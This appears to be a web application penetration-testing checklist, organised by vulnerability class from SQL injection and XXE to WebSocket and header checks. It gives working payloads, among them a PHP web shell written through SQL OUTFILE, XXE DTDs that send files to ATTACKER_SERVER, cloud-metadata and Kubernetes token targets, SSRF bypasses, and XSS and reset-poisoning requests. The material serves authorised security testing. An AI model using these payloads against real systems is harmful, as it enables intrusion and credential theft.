# Web Application VAPT Reference

Detailed testing checklist organized by vulnerability class. Use alongside the main SKILL.md methodology.

## Table of Contents
1. [SQL Injection](#sql-injection)
2. [XXE (XML External Entity)](#xxe)
3. [SSRF](#ssrf)
4. [XSS](#xss)
5. [Authentication Attacks](#authentication-attacks)
6. [RBAC & Privilege Escalation](#rbac--privilege-escalation)
7. [Business Logic](#business-logic)
8. [File Upload](#file-upload)
9. [WebSocket Testing](#websocket-testing)
10. [Header & Config Checks](#header--config-checks)

---

## SQL Injection

### Standard Parameter Testing
Test every user-controlled input: GET params, POST body, path params, headers (Cookie, Referer, X-Forwarded-For), JSON values.

**Detection payloads:**
```
' OR 1=1--
" OR 1=1--
1' AND SLEEP(5)--
1 AND 1=1
1 AND 1=2
' UNION SELECT NULL--
```

### Second-Order / Stored SQL Injection
Higher impact, harder to find. Look for:
- **Export/import features** — XML config bodies with SQL in `queryString`, column values, filter conditions
- **Report generators** — user-controlled SQL in report definitions
- **Saved search/filter** — filters stored and executed later

**Exploitation flow (export job example):**
1. Find an endpoint that accepts raw config (e.g., `/admin/system/exportJobType/edit`)
2. Inject `@@version` or `(SELECT user())` as a column value in the config body
3. Trigger the export job
4. Download the export file — injected value appears in output

### Post-Exploitation Enumeration
Once SQLi is confirmed:
```sql
-- MySQL
SELECT @@version
SELECT user()
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema='<db>'
SELECT column_name FROM information_schema.columns WHERE table_name='<table>'

-- Check privileges
SHOW GRANTS FOR CURRENT_USER()
SELECT * FROM information_schema.schema_privileges
SELECT * FROM information_schema.user_privileges

-- High-value tables to look for
user, api_user, oauth_access_token, oauth_refresh_token, session_status, environment_property, gst_invoice_seller_credentials
```

### Privilege Checks
```sql
-- Can we read files?
SELECT LOAD_FILE('/etc/passwd')
-- Can we write files?
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php'
-- Stacked queries? (usually blocked by JDBC)
SELECT 1; SELECT 2
-- Stored procedures?
SELECT routine_name FROM information_schema.routines
```

---

## XXE

### Detection (OOB)
Always start with OOB (out-of-band) to confirm without triggering visible errors.

**Basic OOB entity:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://COLLABORATOR_URL">
]>
<root>&xxe;</root>
```

**External DTD for file exfiltration:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

**evil.dtd (HTTP exfil):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
```

### Escalation Targets
Once basic XXE works, escalate to:

1. **System files**: `/etc/hostname`, `/etc/passwd`, `/proc/self/environ`
2. **Cloud metadata (AWS)**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. **K8s service account**: `file:///var/run/secrets/kubernetes.io/serviceaccount/token`
4. **Internal network scanning**: Try known service ports via HTTP entity (Redis 6379, ES 9200, Prometheus 9090, Grafana 3000, RabbitMQ 15672, K8s API 443/6443, kubelet 10255)

### Error-Based Exfiltration
When OOB exfil is blocked by multi-line content (JSON, multi-line config):
```xml
<!ENTITY % file SYSTEM "file:///target/file">
<!ENTITY % eval "<!ENTITY send SYSTEM 'file:///nonexistent/%file;'>">
```
The `FileNotFoundException` error message will contain the file content. This bypasses URL-encoding limitations.

### FTP-Based Exfiltration
For multi-line content that HTTP can't handle:
- Set up FTP server or use `bore.pub` TCP tunnel
- Point external DTD entity to `ftp://attacker:port/` 
- Multi-line content transmits cleanly over FTP

---

## SSRF

### Test Surfaces
Any feature that makes server-side HTTP requests:
- Webhook URLs, URL previews, import from URL
- Application discovery endpoints
- PDF/image generators that accept URLs
- SVG with external references

### Bypass Techniques
When internal IP filtering exists:
- **DNS rebinding**: point a domain at internal IP
- **Redirect bypass**: `http://attacker.com/redirect?to=http://169.254.169.254`
- **URL encoding**: `http://127.0.0.1` → `http://0x7f000001`
- **IPv6**: `http://[::1]`
- **Short URL**: `http://0/` (resolves to 0.0.0.0)

### Internal Service Enumeration
Once SSRF is confirmed, map the internal network:
```
localhost:8080     — application itself
localhost:6379     — Redis
localhost:9200     — Elasticsearch
localhost:9090     — Prometheus
localhost:3000     — Grafana
localhost:15672    — RabbitMQ management
localhost:5432     — PostgreSQL
localhost:3306     — MySQL
10.x.x.x:443      — K8s API server
10.x.x.x:10255    — kubelet readonly
169.254.169.254    — cloud metadata (AWS/GCP/Azure)
```

---

## XSS

### Reflected XSS
Test in: search boxes, error parameters, URL fragments, redirect URLs.
```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
```

### Stored XSS
Test in: user profile fields, comments, file upload names, import data columns, chat messages.
Look for CSP bypass if CSP exists.

### DOM-Based XSS
Identify from JS source analysis:
- `document.location`, `document.URL`, `document.referrer` used in `innerHTML`, `eval`, `document.write`
- URL hash/fragment used without sanitization

---

## Authentication Attacks

### Password Reset Poisoning
```http
POST /reset-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
If the reset email contains `attacker.com` in the reset link, the vulnerability is confirmed. Check JWT `iss`/`aud` fields too — they may contain the poisoned host.

### User Enumeration
Test via:
- Login error messages ("user not found" vs "wrong password")
- Registration ("email already taken")
- Password reset ("no account with that email")
- Lookup endpoints (`/data/lookup/users?nameOrEmail=`)

### OTP Bypass
- Can OTP be triggered for another user's account without session ownership?
- Is OTP validation client-side only (UI shows OTP prompt but server accepts without it)?
- Can OTP be brute-forced (no rate limiting)?

---

## RBAC & Privilege Escalation

### Testing Matrix
For each endpoint, test with every role:
```
Admin session   → expected behavior (baseline)
Regular user    → should get 403 on admin endpoints
Vendor/limited  → should get 403 on user/admin endpoints
No auth         → should get 401 on all protected endpoints
Cross-tenant    → should get 403 on other tenant's data
```

### Privilege Escalation Vectors
- Direct endpoint access with low-priv session cookie
- HTTP method override: `X-HTTP-Method-Override: PUT` on a GET-restricted endpoint
- Mass assignment: add role/permission fields to profile update
- IDOR on user management endpoints (edit user, assign roles)
- WebSocket STOMP destinations — often lack the same RBAC as HTTP endpoints

### Permission Leak Detection
Watch 403 responses — many apps leak the required permission name:
```json
{"error": "ACCESS_DENIED", "requiredPermission": "ADMIN_USER"}
```
Catalog these to build the full RBAC map.

---

## Business Logic

### IDOR Systematic Testing
For each endpoint with an ID parameter:
1. Make request with your own ID → 200 (baseline)
2. Make request with another user's ID → should be 403
3. Make request with non-existent ID → should be 404 (not 500)

### Mass Assignment
```json
// Normal profile update
{"name": "Amrit", "email": "amrit@example.com"}

// Mass assignment attempt
{"name": "Amrit", "email": "amrit@example.com", "role": "admin", "isAdmin": true, "facilityRoles": [{"role": "ADMIN", "facilityCode": "*"}]}
```
If the API uses strict DTOs (like `EditUserDetailRequest`), unknown fields are rejected. If not, you may escalate privileges.

### CSV/Import Injection
- Single quote in import name causing Internal Error → investigate further
- SQL in import data columns
- Formula injection: `=CMD('calc')` in CSV cells
- Path traversal in uploaded file names

---

## File Upload

### Testing Checklist
1. **Extension bypass**: `.php`, `.php5`, `.phtml`, `.jsp`, `.asp`, `.aspx`, double extension `.jpg.php`
2. **Content-Type bypass**: change `Content-Type` header vs actual file content
3. **Magic bytes**: prepend valid image magic bytes (`GIF89a`, `\xFF\xD8\xFF`) to malicious file
4. **Size limits**: upload oversized files
5. **Path traversal**: `../../etc/passwd` as filename
6. **Stored XSS via filename**: `"><img src=x onerror=alert(1)>.jpg`
7. **SVG XSS**: upload SVG containing `<script>` tags

---

## WebSocket Testing

### Connection & Auth
```javascript
// Test with low-priv session
var ws = new WebSocket('wss://target.com/ws');
// or SockJS
var sock = new SockJS('https://target.com/websocketendpoint');
var stomp = Stomp.over(sock);
stomp.connect({}, function(frame) {
    stomp.subscribe('/topic/admin', function(msg) {
        console.log('Admin message:', msg.body);
    });
});
```

### STOMP Destination Authorization
- Subscribe to admin-only topics from low-priv connection
- SEND to admin action destinations — check if processed (NullPointerException = reached backend, just wrong params; 403 = properly gated)
- Compare HTTP RBAC vs WebSocket RBAC — they're often inconsistent

### Origin Validation
- Connect from an evil origin (`evil.com`) — does the server reject it?
- Check `Access-Control-Allow-Origin` on WebSocket upgrade response
- Note: proxy/CDN may enforce CORS even if app allows `*:*`

---

## Header & Config Checks

### Security Headers Checklist
| Header | Expected | Finding if Missing/Weak |
|--------|----------|------------------------|
| Content-Security-Policy | No unsafe-inline/eval | Low-Medium |
| Strict-Transport-Security | max-age >= 31536000 | Low |
| X-Frame-Options | DENY or SAMEORIGIN | Low |
| X-Content-Type-Options | nosniff | Info |
| Referrer-Policy | strict-origin or no-referrer | Info |
| Permissions-Policy | Restrict camera/mic/geo | Info |

### CORS Analysis
```
Origin: https://evil.com
```
Check if response includes:
- `Access-Control-Allow-Origin: https://evil.com` → vulnerable
- `Access-Control-Allow-Origin: *` → vulnerable (no credentials)
- `Access-Control-Allow-Credentials: true` with reflected origin → critical

### Email Security
```bash
# SPF
dig TXT target.com | grep spf
# DKIM  
dig TXT selector._domainkey.target.com
# DMARC
dig TXT _dmarc.target.com
```
- `p=none` → Medium finding (DMARC not enforced)
- No DMARC record → Medium finding
- `~all` in SPF (softfail) → Low finding
